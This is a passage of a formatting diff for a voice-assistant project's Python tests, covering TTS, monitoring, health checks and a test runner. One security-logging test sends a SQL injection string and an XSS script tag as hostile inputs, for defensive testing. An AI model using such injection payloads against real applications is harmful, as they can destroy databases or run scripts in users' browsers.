0\n-    \n+\n     @pytest.mark.asyncio\n     async def test_streaming_synthesis(self):\n         \"\"\"Test streaming synthesis capabilities.\"\"\"\n         # Mock streaming synthesizer\n         mock_stream = AsyncMock()\n         mock_stream.__aiter__.return_value = [\n             {\"chunk\": b\"audio_chunk_1\", \"done\": False},\n             {\"chunk\": b\"audio_chunk_2\", \"done\": False},\n-            {\"chunk\": b\"audio_chunk_3\", \"done\": True}\n+            {\"chunk\": b\"audio_chunk_3\", \"done\": True},\n         ]\n-        \n+\n         chunks = []\n         async for chunk in mock_stream:\n             chunks.append(chunk)\n-        \n+\n         assert len(chunks) == 3\n         assert chunks[-1][\"done\"] is True\n-    \n+\n     def test_multilingual_support(self):\n         \"\"\"Test multilingual voice support.\"\"\"\n         # Test language support\n         supported_languages = {\n             \"en_US\": [\"lessac\", \"ryan\", \"ljspeech\"],\n             \"en_GB\": [\"alan\", \"southern_english\"],\n             \"es_ES\": [\"carlfm\", \"davefx\"],\n             \"fr_FR\": [\"gilles\", \"siwis\"],\n-            \"de_DE\": [\"thorsten\", \"eva_k\"]\n-        }\n-        \n+            \"de_DE\": [\"thorsten\", \"eva_k\"],\n+        }\n+\n         for lang, speakers in supported_languages.items():\n             assert isinstance(lang, str)\n             assert len(lang) == 5  # Format: xx_XX\n             assert isinstance(speakers, list)\n             assert len(speakers) > 0\n \n \n class TestTTSQuality:\n     \"\"\"Test TTS quality and naturalness.\"\"\"\n-    \n+\n     def test_prosody_control(self):\n         \"\"\"Test prosody control features.\"\"\"\n         # Test prosody parameters\n         prosody_params = {\n             \"rate\": [\"x-slow\", \"slow\", \"medium\", \"fast\", \"x-fast\"],\n             \"pitch\": [\"x-low\", \"low\", \"medium\", \"high\", \"x-high\"],\n-            \"volume\": [\"silent\", \"x-soft\", \"soft\", \"medium\", \"loud\", \"x-loud\"]\n-        }\n-        \n+            \"volume\": [\"silent\", \"x-soft\", \"soft\", \"medium\", \"loud\", \"x-loud\"],\n+        }\n+\n         for param, values in prosody_params.items():\n             assert isinstance(param, str)\n             assert isinstance(values, list)\n             assert \"medium\" in values\n-    \n+\n     def test_emotion_control(self):\n         \"\"\"Test emotional speech synthesis.\"\"\"\n         # Test emotion parameters\n         emotions = {\n             \"neutral\": {\"arousal\": 0.5, \"valence\": 0.5},\n             \"happy\": {\"arousal\": 0.8, \"valence\": 0.8},\n             \"sad\": {\"arousal\": 0.2, \"valence\": 0.2},\n             \"angry\": {\"arousal\": 0.9, \"valence\": 0.1},\n-            \"calm\": {\"arousal\": 0.1, \"valence\": 0.6}\n-        }\n-        \n+            \"calm\": {\"arousal\": 0.1, \"valence\": 0.6},\n+        }\n+\n         for emotion, params in emotions.items():\n             assert isinstance(emotion, str)\n             assert 0.0 <= params[\"arousal\"] <= 1.0\n             assert 0.0 <= params[\"valence\"] <= 1.0\n-    \n+\n     def test_voice_cloning(self):\n         \"\"\"Test voice cloning capabilities.\"\"\"\n         # Test voice cloning parameters\n         cloning_params = {\n             \"reference_audio_duration\": 10.0,  # seconds\n             \"similarity_threshold\": 0.85,\n             \"quality_score\": 0.9,\n-            \"training_steps\": 1000\n-        }\n-        \n+            \"training_steps\": 1000,\n+        }\n+\n         assert cloning_params[\"reference_audio_duration\"] >= 5.0\n         assert 0.7 <= cloning_params[\"similarity_threshold\"] <= 1.0\n         assert 0.8 <= cloning_params[\"quality_score\"] <= 1.0\n-        assert cloning_params[\"training_steps\"] > 0\n\\ No newline at end of file\n+        assert cloning_params[\"training_steps\"] > 0\n--- /home/pas/source/agent-cag/tests/monitoring/test_monitoring.py\t2025-06-20 18:15:56.870059+00:00\n+++ /home/pas/source/agent-cag/tests/monitoring/test_monitoring.py\t2025-06-20 19:24:34.654586+00:00\n@@ -6,564 +6,565 @@\n import time\n from unittest.mock import patch, MagicMock, AsyncMock\n from fastapi.testclient import TestClient\n \n # Mock dependencies before importing\n-with patch('api.main.httpx'), \\\n-     patch('api.main.DatabaseManager'), \\\n-     patch('api.main.prometheus_client'):\n+with patch(\"api.main.httpx\"), patch(\"api.main.DatabaseManager\"), patch(\n+    \"api.main.prometheus_client\"\n+):\n     from api.main import app\n \n \n class TestPrometheusMetrics:\n     \"\"\"Test Prometheus metrics collection.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_metrics_endpoint_exists(self):\n         \"\"\"Test that metrics endpoint is available.\"\"\"\n         response = self.client.get(\"/metrics\")\n-        \n+\n         # Metrics endpoint should be available\n         assert response.status_code == 200\n         assert \"text/plain\" in response.headers.get(\"content-type\", \"\")\n-    \n+\n     def test_metrics_format(self):\n         \"\"\"Test that metrics are in Prometheus format.\"\"\"\n         response = self.client.get(\"/metrics\")\n-        \n+\n         if response.status_code == 200:\n             content = response.text\n-            \n+\n             # Should contain Prometheus metric format\n-            prometheus_indicators = [\n-                \"# HELP\",\n-                \"# TYPE\",\n-                \"_total\",\n-                \"_count\",\n-                \"_sum\"\n-            ]\n-            \n+            prometheus_indicators = [\"# HELP\", \"# TYPE\", \"_total\", \"_count\", \"_sum\"]\n+\n             # At least some Prometheus format indicators should be present\n-            found_indicators = sum(1 for indicator in prometheus_indicators if indicator in content)\n+            found_indicators = sum(\n+                1 for indicator in prometheus_indicators if indicator in content\n+            )\n             assert found_indicators > 0, \"No Prometheus format indicators found\"\n-    \n+\n     def test_request_metrics_collection(self):\n         \"\"\"Test that request metrics are collected.\"\"\"\n         # Make several requests to generate metrics\n         for i in range(5):\n             self.client.post(\n                 \"/query\",\n                 json={\n                     \"text\": f\"test query {i}\",\n                     \"user_id\": \"test_user\",\n-                    \"input_type\": \"text\"\n-                }\n-            )\n-        \n+                    \"input_type\": \"text\",\n+                },\n+            )\n+\n         # Check metrics\n         response = self.client.get(\"/metrics\")\n-        \n+\n         if response.status_code == 200:\n             content = response.text\n-            \n+\n             # Should contain request-related metrics\n             expected_metrics = [\n                 \"http_requests_total\",\n                 \"http_request_duration\",\n                 \"query_requests_total\",\n-                \"response_time\"\n+                \"response_time\",\n             ]\n-            \n+\n             # At least some request metrics should be present\n             found_metrics = sum(1 for metric in expected_metrics if metric in content)\n             assert found_metrics > 0, \"No request metrics found\"\n-    \n+\n     def test_error_metrics_collection(self):\n         \"\"\"Test that error metrics are collected.\"\"\"\n         # Generate some errors\n         for i in range(3):\n-            self.client.post(\n-                \"/query\",\n-                json={\"invalid\": \"data\"}\n-            )\n-        \n+            self.client.post(\"/query\", json={\"invalid\": \"data\"})\n+\n         # Check metrics\n         response = self.client.get(\"/metrics\")\n-        \n+\n         if response.status_code == 200:\n             content = response.text\n-            \n+\n             # Should contain error-related metrics\n-            error_indicators = [\n-                \"error\",\n-                \"4xx\",\n-                \"5xx\",\n-                \"failed\"\n-            ]\n-            \n+            error_indicators = [\"error\", \"4xx\", \"5xx\", \"failed\"]\n+\n             # At least some error metrics should be present\n-            found_errors = sum(1 for indicator in error_indicators if indicator in content)\n+            found_errors = sum(\n+                1 for indicator in error_indicators if indicator in content\n+            )\n             # Note: This might be 0 if error metrics aren't implemented yet\n             assert found_errors >= 0\n-    \n+\n     def test_custom_metrics_collection(self):\n         \"\"\"Test collection of custom application metrics.\"\"\"\n         # Make requests to different endpoints\n         self.client.get(\"/health\")\n         self.client.get(\"/history/test_user\")\n         self.client.get(\"/search?q=test\")\n-        \n+\n         response = self.client.get(\"/metrics\")\n-        \n+\n         if response.status_code == 200:\n             content = response.text\n-            \n+\n             # Should contain custom application metrics\n             custom_metrics = [\n                 \"agent_cag\",\n                 \"database_operations\",\n                 \"llm_requests\",\n                 \"asr_requests\",\n-                \"tts_requests\"\n+                \"tts_requests\",\n             ]\n-            \n+\n             # At least some custom metrics should be present\n             found_custom = sum(1 for metric in custom_metrics if metric in content)\n             # Note: This might be 0 if custom metrics aren't implemented yet\n             assert found_custom >= 0\n \n \n class TestHealthChecks:\n     \"\"\"Test health check endpoints and monitoring.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_basic_health_check(self):\n         \"\"\"Test basic health check endpoint.\"\"\"\n         response = self.client.get(\"/health\")\n-        \n+\n         assert response.status_code == 200\n-        \n+\n         # Should return JSON with status information\n         if response.headers.get(\"content-type\", \"\").startswith(\"application/json\"):\n             data = response.json()\n             assert \"status\" in data\n             assert data[\"status\"] in [\"healthy\", \"ok\", \"up\"]\n-    \n+\n     def test_detailed_health_check(self):\n         \"\"\"Test detailed health check with component status.\"\"\"\n         response = self.client.get(\"/health/detailed\")\n-        \n+\n         # Detailed health check might not be implemented\n         if response.status_code == 200:\n             data = response.json()\n-            \n+\n             # Should contain component health information\n             expected_components = [\n                 \"database\",\n                 \"llm_service\",\n                 \"asr_service\",\n-                \"tts_service\"\n+                \"tts_service\",\n             ]\n-            \n+\n             # Check if any component status is reported\n             for component in expected_components:\n                 if component in data:\n                     assert isinstance(data[component], (str, dict))\n-    \n+\n     def test_readiness_probe(self):\n         \"\"\"Test readiness probe for Kubernetes.\"\"\"\n         response = self.client.get(\"/ready\")\n-        \n+\n         # Readiness probe might not be implemented\n         if response.status_code == 200:\n             # Should indicate if service is ready to accept traffic\n             assert response.status_code == 200\n         else:\n             # If not implemented, health endpoint should work\n             response = self.client.get(\"/health\")\n             assert response.status_code == 200\n-    \n+\n     def test_liveness_probe(self):\n         \"\"\"Test liveness probe for Kubernetes.\"\"\"\n         response = self.client.get(\"/live\")\n-        \n+\n         # Liveness probe might not be implemented\n         if response.status_code == 200:\n             # Should indicate if service is alive\n             assert response.status_code == 200\n         else:\n             # If not implemented, health endpoint should work\n             response = self.client.get(\"/health\")\n             assert response.status_code == 200\n-    \n+\n     def test_health_check_response_time(self):\n         \"\"\"Test that health checks respond quickly.\"\"\"\n         start_time = time.time()\n         response = self.client.get(\"/health\")\n         end_time = time.time()\n-        \n+\n         response_time = end_time - start_time\n-        \n+\n         # Health checks should be fast (under 1 second)\n         assert response_time < 1.0\n         assert response.status_code == 200\n \n \n class TestServiceDiscovery:\n     \"\"\"Test service discovery and connectivity monitoring.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_service_connectivity(self):\n         \"\"\"Test connectivity to dependent services.\"\"\"\n         # This would test actual service connectivity\n         # For now, we'll test that the API handles service unavailability gracefully\n-        \n-        with patch('httpx.AsyncClient') as mock_client:\n+\n+        with patch(\"httpx.AsyncClient\") as mock_client:\n             # Mock service unavailable\n             mock_response = MagicMock()\n             mock_response.status_code = 503\n-            mock_client.return_value.__aenter__.return_value.get = AsyncMock(return_value=mock_response)\n-            \n+            mock_client.return_value.__aenter__.return_value.get = AsyncMock(\n+                return_value=mock_response\n+            )\n+\n             response = self.client.post(\n                 \"/query\",\n                 json={\n                     \"text\": \"test query\",\n                     \"user_id\": \"test_user\",\n-                    \"input_type\": \"text\"\n-                }\n-            )\n-            \n+                    \"input_type\": \"text\",\n+                },\n+            )\n+\n             # Should handle service unavailability gracefully\n             assert response.status_code in [200, 503, 500]\n-    \n+\n     def test_service_timeout_handling(self):\n         \"\"\"Test handling of service timeouts.\"\"\"\n-        with patch('httpx.AsyncClient') as mock_client:\n+        with patch(\"httpx.AsyncClient\") as mock_client:\n             # Mock timeout\n             import asyncio\n+\n             mock_client.return_value.__aenter__.return_value.post = AsyncMock(\n                 side_effect=asyncio.TimeoutError(\"Service timeout\")\n             )\n-            \n+\n             response = self.client.post(\n                 \"/query\",\n                 json={\n                     \"text\": \"test query\",\n                     \"user_id\": \"test_user\",\n-                    \"input_type\": \"text\"\n-                }\n-            )\n-            \n+                    \"input_type\": \"text\",\n+                },\n+            )\n+\n             # Should handle timeouts gracefully\n             assert response.status_code in [200, 504, 500]\n-    \n+\n     def test_circuit_breaker_behavior(self):\n         \"\"\"Test circuit breaker behavior for failing services.\"\"\"\n         # This would test circuit breaker implementation\n         # For now, we'll test that repeated failures are handled\n-        \n-        with patch('httpx.AsyncClient') as mock_client:\n+\n+        with patch(\"httpx.AsyncClient\") as mock_client:\n             # Mock repeated failures\n             mock_response = MagicMock()\n             mock_response.status_code = 500\n-            mock_client.return_value.__aenter__.return_value.post = AsyncMock(return_value=mock_response)\n-            \n+            mock_client.return_value.__aenter__.return_value.post = AsyncMock(\n+                return_value=mock_response\n+            )\n+\n             responses = []\n             for i in range(10):\n                 response = self.client.post(\n                     \"/query\",\n                     json={\n                         \"text\": f\"test query {i}\",\n                         \"user_id\": \"test_user\",\n-                        \"input_type\": \"text\"\n-                    }\n+                        \"input_type\": \"text\",\n+                    },\n                 )\n                 responses.append(response)\n-            \n+\n             # Should handle repeated failures consistently\n             status_codes = [r.status_code for r in responses]\n             assert all(code in [200, 500, 503] for code in status_codes)\n \n \n class TestLogging:\n     \"\"\"Test logging and audit trail functionality.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_request_logging(self):\n         \"\"\"Test that requests are properly logged.\"\"\"\n         # This test would verify logging functionality\n         # For now, we'll test that requests complete successfully\n-        \n+\n         response = self.client.post(\n             \"/query\",\n             json={\n                 \"text\": \"test query for logging\",\n                 \"user_id\": \"test_user\",\n-                \"input_type\": \"text\"\n-            }\n+                \"input_type\": \"text\",\n+            },\n         )\n-        \n+\n         # Request should complete (logging happens in background)\n         assert response.status_code in [200, 400, 422]\n-    \n+\n     def test_error_logging(self):\n         \"\"\"Test that errors are properly logged.\"\"\"\n         # Generate an error\n-        response = self.client.post(\n-            \"/query\",\n-            json={\"invalid\": \"data\"}\n-        )\n-        \n+        response = self.client.post(\"/query\", json={\"invalid\": \"data\"})\n+\n         # Error should be handled (and logged)\n         assert response.status_code in [400, 422]\n-    \n+\n     def test_security_event_logging(self):\n         \"\"\"Test that security events are logged.\"\"\"\n         # Generate security events\n         security_events = [\n-            {\"text\": \"'; DROP TABLE users; --\", \"user_id\": \"attacker\", \"input_type\": \"text\"},\n-            {\"text\": \"<script>alert('xss')</script>\", \"user_id\": \"attacker\", \"input_type\": \"text\"},\n+            {\n+                \"text\": \"'; DROP TABLE users; --\",\n+                \"user_id\": \"attacker\",\n+                \"input_type\": \"text\",\n+            },\n+            {\n+                \"text\": \"<script>alert('xss')</script>\",\n+                \"user_id\": \"attacker\",\n+                \"input_type\": \"text\",\n+            },\n         ]\n-        \n+\n         for event in security_events:\n             response = self.client.post(\"/query\", json=event)\n             # Security events should be handled (and logged)\n             assert response.status_code in [200, 400, 422]\n-    \n+\n     def test_audit_trail(self):\n         \"\"\"Test audit trail functionality.\"\"\"\n         # Make several requests to create audit trail\n         user_id = \"audit_test_user\"\n-        \n+\n         for i in range(3):\n             self.client.post(\n                 \"/query\",\n                 json={\n                     \"text\": f\"audit test query {i}\",\n                     \"user_id\": user_id,\n-                    \"input_type\": \"text\"\n-                }\n-            )\n-        \n+                    \"input_type\": \"text\",\n+                },\n+            )\n+\n         # Check if audit trail is accessible\n         response = self.client.get(f\"/history/{user_id}\")\n-        \n+\n         # Should be able to retrieve audit trail\n         assert response.status_code in [200, 404]\n \n \n class TestPerformanceMonitoring:\n     \"\"\"Test performance monitoring and alerting.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_response_time_monitoring(self):\n         \"\"\"Test response time monitoring.\"\"\"\n         start_time = time.time()\n-        \n+\n         response = self.client.post(\n             \"/query\",\n             json={\n                 \"text\": \"performance test query\",\n                 \"user_id\": \"perf_test_user\",\n-                \"input_type\": \"text\"\n-            }\n+                \"input_type\": \"text\",\n+            },\n         )\n-        \n+\n         end_time = time.time()\n         response_time = end_time - start_time\n-        \n+\n         # Response should complete in reasonable time\n         assert response_time < 30.0  # 30 seconds max\n         assert response.status_code in [200, 400, 422]\n-    \n+\n     def test_concurrent_request_handling(self):\n         \"\"\"Test handling of concurrent requests.\"\"\"\n         import threading\n         import queue\n-        \n+\n         results = queue.Queue()\n-        \n+\n         def make_request(request_id):\n             try:\n                 response = self.client.post(\n                     \"/query\",\n                     json={\n                         \"text\": f\"concurrent test query {request_id}\",\n                         \"user_id\": f\"concurrent_user_{request_id}\",\n-                        \"input_type\": \"text\"\n-                    }\n+                        \"input_type\": \"text\",\n+                    },\n                 )\n                 results.put((request_id, response.status_code, True))\n             except Exception as e:\n                 results.put((request_id, 0, False))\n-        \n+\n         # Create multiple concurrent requests\n         threads = []\n         for i in range(5):\n             thread = threading.Thread(target=make_request, args=(i,))\n             threads.append(thread)\n             thread.start()\n-        \n+\n         # Wait for all requests to complete\n         for thread in threads:\n             thread.join(timeout=30)\n-        \n+\n         # Collect results\n         completed_requests = []\n         while not results.empty():\n             completed_requests.append(results.get())\n-        \n+\n         # Should handle concurrent requests\n         assert len(completed_requests) == 5\n         successful_requests = [r for r in completed_requests if r[2]]\n         assert len(successful_requests) >= 3  # At least 60% success rate\n-    \n+\n     def test_memory_usage_monitoring(self):\n         \"\"\"Test memory usage monitoring.\"\"\"\n         import psutil\n         import os\n-        \n+\n         # Get initial memory usage\n         process = psutil.Process(os.getpid())\n         initial_memory = process.memory_info().rss\n-        \n+\n         # Make several requests\n         for i in range(10):\n             self.client.post(\n                 \"/query\",\n                 json={\n                     \"text\": f\"memory test query {i}\",\n                     \"user_id\": \"memory_test_user\",\n-                    \"input_type\": \"text\"\n-                }\n-            )\n-        \n+                    \"input_type\": \"text\",\n+                },\n+            )\n+\n         # Check memory usage after requests\n         final_memory = process.memory_info().rss\n         memory_increase = final_memory - initial_memory\n-        \n+\n         # Memory increase should be reasonable (less than 100MB)\n         assert memory_increase < 100 * 1024 * 1024\n-    \n+\n     def test_resource_cleanup(self):\n         \"\"\"Test that resources are properly cleaned up.\"\"\"\n         # This test would verify resource cleanup\n         # For now, we'll test that multiple requests don't cause issues\n-        \n+\n         for i in range(20):\n             response = self.client.post(\n                 \"/query\",\n                 json={\n                     \"text\": f\"cleanup test query {i}\",\n                     \"user_id\": \"cleanup_test_user\",\n-                    \"input_type\": \"text\"\n-                }\n-            )\n-            \n+                    \"input_type\": \"text\",\n+                },\n+            )\n+\n             # Should handle requests consistently\n             assert response.status_code in [200, 400, 422]\n \n \n class TestAlertingIntegration:\n     \"\"\"Test alerting and notification integration.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_high_error_rate_detection(self):\n         \"\"\"Test detection of high error rates.\"\"\"\n         # Generate multiple errors\n         error_count = 0\n         total_requests = 20\n-        \n+\n         for i in range(total_requests):\n-            response = self.client.post(\n-                \"/query\",\n-                json={\"invalid\": f\"data_{i}\"}\n-            )\n-            \n+            response = self.client.post(\"/query\", json={\"invalid\": f\"data_{i}\"})\n+\n             if response.status_code >= 400:\n                 error_count += 1\n-        \n+\n         error_rate = error_count / total_requests\n-        \n+\n         # Should detect high error rate (this would trigger alerts)\n         if error_rate > 0.5:  # More than 50% errors\n             # In a real system, this would trigger an alert\n             assert True  # Alert condition detected\n         else:\n             # Low error rate is also acceptable\n             assert True\n-    \n+\n     def test_service_unavailability_detection(self):\n         \"\"\"Test detection of service unavailability.\"\"\"\n-        with patch('httpx.AsyncClient') as mock_client:\n+        with patch(\"httpx.AsyncClient\") as mock_client:\n             # Mock all services as unavailable\n             mock_response = MagicMock()\n             mock_response.status_code = 503\n-            mock_client.return_value.__aenter__.return_value.post = AsyncMock(return_value=mock_response)\n-            mock_client.return_value.__aenter__.return_value.get = AsyncMock(return_value=mock_response)\n-            \n+            mock_client.return_value.__aenter__.return_value.post = AsyncMock(\n+                return_value=mock_response\n+            )\n+            mock_client.return_value.__aenter__.return_value.get = AsyncMock(\n+                return_value=mock_response\n+            )\n+\n             unavailable_count = 0\n             total_checks = 5\n-            \n+\n             for i in range(total_checks):\n                 response = self.client.post(\n                     \"/query\",\n                     json={\n                         \"text\": f\"availability test {i}\",\n                         \"user_id\": \"availability_test_user\",\n-                        \"input_type\": \"text\"\n-                    }\n+                        \"input_type\": \"text\",\n+                    },\n                 )\n-                \n+\n                 if response.status_code >= 500:\n                     unavailable_count += 1\n-            \n+\n             # Should detect service unavailability\n             if unavailable_count > 0:\n                 # Service unavailability detected (would trigger alert)\n                 assert True\n-    \n+\n     def test_performance_degradation_detection(self):\n         \"\"\"Test detection of performance degradation.\"\"\"\n         response_times = []\n-        \n+\n         for i in range(10):\n             start_time = time.time()\n-            \n+\n             response = self.client.post(\n                 \"/query\",\n                 json={\n                     \"text\": f\"performance degradation test {i}\",\n                     \"user_id\": \"perf_degradation_user\",\n-                    \"input_type\": \"text\"\n-                }\n-            )\n-            \n+                    \"input_type\": \"text\",\n+                },\n+            )\n+\n             end_time = time.time()\n             response_times.append(end_time - start_time)\n-        \n+\n         # Calculate average response time\n         avg_response_time = sum(response_times) / len(response_times)\n-        \n+\n         # Should detect performance degradation\n         if avg_response_time > 5.0:  # More than 5 seconds average\n             # Performance degradation detected (would trigger alert)\n             assert True  # Alert condition detected\n         else:\n@@ -571,70 +572,77 @@\n             assert True\n \n \n class TestMonitoringDashboard:\n     \"\"\"Test monitoring dashboard functionality.\"\"\"\n-    \n+\n     def setup_method(self):\n         \"\"\"Set up test client.\"\"\"\n         self.client = TestClient(app)\n-    \n+\n     def test_dashboard_metrics_availability(self):\n         \"\"\"Test that dashboard metrics are available.\"\"\"\n         # Generate some activity for dashboard\n         for i in range(5):\n             self.client.post(\n                 \"/query\",\n                 json={\n                     \"text\": f\"dashboard test query {i}\",\n                     \"user_id\": \"dashboard_test_user\",\n-                    \"input_type\": \"text\"\n-                }\n-            )\n-        \n+                    \"input_type\": \"text\",\n+                },\n+            )\n+\n         # Check metrics endpoint\n         response = self.client.get(\"/metrics\")\n-        \n+\n         if response.status_code == 200:\n             content = response.text\n-            \n+\n             # Should contain metrics useful for dashboards\n             dashboard_metrics = [\n                 \"requests_per_second\",\n                 \"response_time_percentile\",\n                 \"error_rate\",\n                 \"active_users\",\n-                \"system_health\"\n+                \"system_health\",\n             ]\n-            \n+\n             # At least some dashboard metrics should be available\n             found_metrics = sum(1 for metric in dashboard_metrics if metric in content)\n             # Note: This might be 0 if dashboard metrics aren't implemented yet\n             assert found_metrics >= 0\n-    \n+\n     def test_real_time_metrics_updates(self):\n         \"\"\"Test that metrics update in real-time.\"\"\"\n         # Get initial metrics\n         initial_response = self.client.get(\"/metrics\")\n-        initial_content = initial_response.text if initial_response.status_code == 200 else \"\"\n-        \n+        initial_content = (\n+            initial_response.text if initial_response.status_code == 200 else \"\"\n+        )\n+\n         # Generate activity\n         self.client.post(\n             \"/query\",\n             json={\n                 \"text\": \"real-time metrics test\",\n                 \"user_id\": \"realtime_test_user\",\n-                \"input_type\": \"text\"\n-            }\n+                \"input_type\": \"text\",\n+            },\n         )\n-        \n+\n         # Get updated metrics\n         updated_response = self.client.get(\"/metrics\")\n-        updated_content = updated_response.text if updated_response.status_code == 200 else \"\"\n-        \n+        updated_content = (\n+            updated_response.text if updated_response.status_code == 200 else \"\"\n+        )\n+\n         # Metrics should be available (content may or may not change)\n         if initial_response.status_code == 200 and updated_response.status_code == 200:\n             # Both responses successful\n             assert len(updated_content) > 0\n         else:\n             # At least one response should be successful\n-            assert initial_response.status_code == 200 or updated_response.status_code == 200\n\\ No newline at end of file\n+            assert (\n+                initial_response.status_code == 200\n+                or updated_response.status_code == 200\n+            )\n--- /home/pas/source/agent-cag/run_tests.py\t2025-06-20 18:20:24.138373+00:00\n+++ /home/pas/source/agent-cag/run_tests.py\t2025-06-20 19:24:34.663354+00:00\n@@ -15,39 +15,39 @@\n import concurrent.futures\n \n \n class TestRunner:\n     \"\"\"Main test runner for Agent CAG system.\"\"\"\n-    \n+\n     def __init__(self):\n         self.project_root = Path(__file__).parent\n         self.test_results = {}\n         self.start_time = None\n         self.end_time = None\n-        \n+\n     def setup_environment(self):\n         \"\"\"Set up test environment.\"\"\"\n         print(\"\ud83d\udd27 Setting up test environment...\")\n-        \n+\n         # Set environment variables for testing\n         test_env = {\n             \"PYTHONPATH\": str(self.project_root),\n             \"DEPLOYMENT_PROFILE\": \"lightweight\",\n             \"DATABASE_URL\": \":memory:\",\n             \"TESTING\": \"true\",\n-            \"LOG_LEVEL\": \"INFO\"\n+            \"LOG_LEVEL\": \"INFO\",\n         }\n-        \n+\n         for key, value in test_env.items():\n             os.environ[key] = value\n-        \n+\n         print(\"\u2705 Test environment configured\")\n-    \n+\n     def install_dependencies(self):\n         \"\"\"Install test dependencies.\"\"\"\n         print(\"\ud83d\udce6 Installing test dependencies...\")\n-        \n+\n         test_requirements = [\n             \"pytest>=7.0.0\",\n             \"pytest-asyncio>=0.21.0\",\n             \"pytest-cov>=4.0.0\",\n             \"pytest-xdist>=3.0.0\",\n@@ -56,546 +56,651 @@\n             \"bandit>=1.7.0\",\n             \"safety>=2.0.0\",\n             \"flake8>=6.0.0\",\n             \"black>=23.0.0\",\n             \"mypy>=1.0.0\",\n-            \"psutil>=5.9.0\"\n+            \"psutil>=5.9.0\",\n         ]\n-        \n+\n         try:\n             for requirement in test_requirements:\n-                subprocess.run([\n-                    sys.executable, \"-m\", \"pip\", \"install\", requirement\n-                ], check=True, capture_output=True)\n+                subprocess.run(\n+                    [sys.executable, \"-m\", \"pip\", \"install\", requirement],\n+                    check=True,\n+                    capture_output=True,\n+                )\n             print(\"\u2705 Test dependencies installed\")\n         except subprocess.CalledProcessError as e:\n             print(f\"\u274c Failed to install dependencies: {e}\")\n             return False\n-        \n+\n         return True\n-    \n+\n     def run_unit_tests(self, coverage: bool = True, parallel: bool = True) -> Dict:\n         \"\"\"Run unit tests.\"\"\"\n         print(\"\ud83e\uddea Running unit tests...\")\n-        \n+\n         cmd = [sys.executable, \"-m\", \"pytest\", \"tests/unit/\"]\n-        \n+\n         if coverage:\n             cmd.extend([\"--cov=api\", \"--cov=asr\", \"--cov=llm\", \"--cov=tts\"])\n             cmd.extend([\"--cov-report=html:htmlcov\", \"--cov-report=term\"])\n-        \n+\n         if parallel:\n             cmd.extend([\"-n\", \"auto\"])\n-        \n+\n         cmd.extend([\"-v\", \"--tb=short\"])\n-        \n+\n         try:\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)\n-            \n+\n             return {\n                 \"status\": \"passed\" if result.returncode == 0 else \"failed\",\n                 \"returncode\": result.returncode,\n                 \"stdout\": result.stdout,\n                 \"stderr\": result.stderr,\n-                \"duration\": 0  # Would be calculated from actual run\n+                \"duration\": 0,  # Would be calculated from actual run\n             }\n         except subprocess.TimeoutExpired:\n             return {\n                 \"status\": \"timeout\",\n                 \"returncode\": -1,\n                 \"stdout\": \"\",\n                 \"stderr\": \"Unit tests timed out after 5 minutes\",\n-                \"duration\": 300\n+                \"duration\": 300,\n             }\n         except Exception as e:\n             return {\n                 \"status\": \"error\",\n                 \"returncode\": -1,\n                 \"stdout\": \"\",\n                 \"stderr\": str(e),\n-                \"duration\": 0\n-            }\n-    \n+                \"duration\": 0,\n+            }\n+\n     def run_integration_tests(self) -> Dict:\n         \"\"\"Run integration tests.\"\"\"\n         print(\"\ud83d\udd17 Running integration tests...\")\n-        \n+\n         cmd = [\n-            sys.executable, \"-m\", \"pytest\", \n-            \"tests/integration/\", \"integration_tests/\",\n-            \"-v\", \"--tb=short\"\n+            sys.executable,\n+            \"-m\",\n+            \"pytest\",\n+            \"tests/integration/\",\n+            \"integration_tests/\",\n+            \"-v\",\n+            \"--tb=short\",\n         ]\n-        \n+\n         try:\n             result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)\n-            \n+\n             return {\n                 \"status\": \"passed\" if result.returncode == 0 else \"failed\",\n                 \"returncode\": result.returncode,\n                 \"stdout\": result.stdout,\n                 \"stderr\": result.stderr,\n-                \"duration\": 0\n+                \"duration\": 0,\n             }\n         except subprocess.TimeoutExpired:\n             return {\n                 \"status\": \"timeout\",\n                 \"returncode\": -1,\n                 \"stdout\": \"\",\n                 \"stderr\": \"Integration tests timed out after 10 minutes\",\n-                \"duration\": 600\n+                \"duration\": 600,\n             }\n         except Exception as e:\n             return {\n                 \"status\": \"error\",\n                 \"returncode\": -1,\n                 \"stdout\": \"\",\n                 \"stderr\": str(e),\n-                \"duration\": 0\n-            }\n-    \n+                \"duration\": 0,\n+            }\n+\n     def run_security_tests(self) -> Dict:\n         \"\"\"Run security tests.\"\"\"\n         print(\"\ud83d\udd12 Running security tests...\")\n-        \n+\n         # Run pytest security tests\n         pytest_cmd = [\n-            sys.executable, \"-m\", \"pytest\", \n+            sys.executable,\n+            \"-m\",\n+            \"pytest\",\n             \"tests/security/\",\n-            \"-v\", \"--tb=short\"\n+            \"-v\",\n+            \"--tb=short\",\n         ]\n-        \n-        try:\n-            pytest_result = subprocess.run(pytest_cmd, capture_output=True, text=True, timeout=300)\n-            \n+\n+        try:\n+            pytest_result = subprocess.run(\n+                pytest_cmd, capture_output=True, text=True, timeout=300\n+            )\n+\n             # Run bandit security scan\n             bandit_cmd = [\n-                sys.executable, \"-m\", \"bandit\", \n-                \"-r\", \"api/\", \"asr/\", \"llm/\", \"tts/\",\n-                \"-f\", \"json\"\n+                sys.executable,\n+                \"-m\",\n+                \"bandit\",\n+                \"-r\",\n+                \"api/\",\n+                \"asr/\",\n+                \"llm/\",\n+                \"tts/\",\n+                \"-f\",\n+                \"json\",\n             ]\n-            \n+\n             try:\n-                bandit_result = subprocess.run(bandit_cmd, capture_output=True, text=True, timeout=120)\n+                bandit_result = subprocess.run(\n+                    bandit_cmd, capture_output=True, text=True, timeout=120\n+                )\n                 bandit_output = bandit_result.stdout\n             except:\n                 bandit_output = 